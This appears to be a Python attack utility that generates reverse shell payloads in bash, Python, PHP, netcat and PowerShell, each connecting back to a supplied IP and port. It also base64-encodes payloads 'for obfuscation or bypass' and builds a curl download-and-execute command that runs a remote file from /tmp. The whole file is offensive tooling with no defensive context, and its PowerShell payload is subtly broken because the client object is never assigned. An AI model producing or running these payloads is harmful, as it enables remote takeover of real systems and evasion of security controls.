import base64

def generate_reverse_shell(ip, port, shell_type="bash"):
    """Generate reverse shell commands for various shell types."""
    if shell_type == "bash":
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

    elif shell_type == "python":
        return (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{ip}\",{port}));"
            f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
            f"import pty;pty.spawn(\"/bin/bash\")'"
        )

    elif shell_type == "php":
        return f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    elif shell_type == "nc":
        return f"nc -e /bin/sh {ip} {port}"

    elif shell_type == "powershell":
        return (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}}; "
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) "
            f"{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); "
            f"$sendback = (iex $data 2>&1 | Out-String ); "
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; "
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); "
            f"$stream.Write($sendbyte,0,$sendbyte.Length); "
            f"$stream.Flush()}}; $client.Close()"
        )

    else:
        return "[!] Unsupported shell type."


def base64_encode_payload(payload):
    """Encode any payload string in Base64 for easier obfuscation or bypass."""
    encoded = base64.b64encode(payload.encode()).decode()
    return encoded


def generate_download_execute(url, filename="payload.sh"):
    """
    Generate a payload that downloads and executes a file from a remote URL.
    Works on Linux/macOS systems with curl and bash.
    """
    payload = f"curl -o /tmp/{filename} {url} && chmod +x /tmp/{filename} && /tmp/{filename}"
    return payload
